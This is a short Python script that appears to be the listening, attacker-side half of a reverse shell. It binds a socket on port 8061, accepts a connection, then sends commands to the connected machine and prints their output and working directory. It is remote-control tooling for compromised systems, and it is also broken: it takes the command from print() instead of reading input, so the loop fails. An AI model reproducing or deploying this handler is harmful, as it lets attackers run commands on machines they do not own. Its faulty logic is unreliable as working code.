import socket

hostIP = "0.0.0.0"
hostPORT = 8061
hostBuffer = 1024 * 128
seperator = "<sep>"

s = socket.socket()

s.bind((hostIP, hostPORT))

s.listen(5)
print(f"Listening on {hostIP}/{hostPORT}")

clientSocket, clientAddress = s.accept()
print(f"{clientAddress[0]}:{clientAddress[1]} Connected")

cwd = clientSocket.recv(hostBuffer).decode()
print("[$] Current working diresctory: ", cwd)

while True:
    command = print(f"{cwd} $>")
    if not command.strip():
        continue

    clientSocket.send(command.encode())
    if command.lower() == "exit":
        break

    output = clientSocket.recv(hostBuffer).decode()

    results, cwd = output.split(seperator)

    print(results)

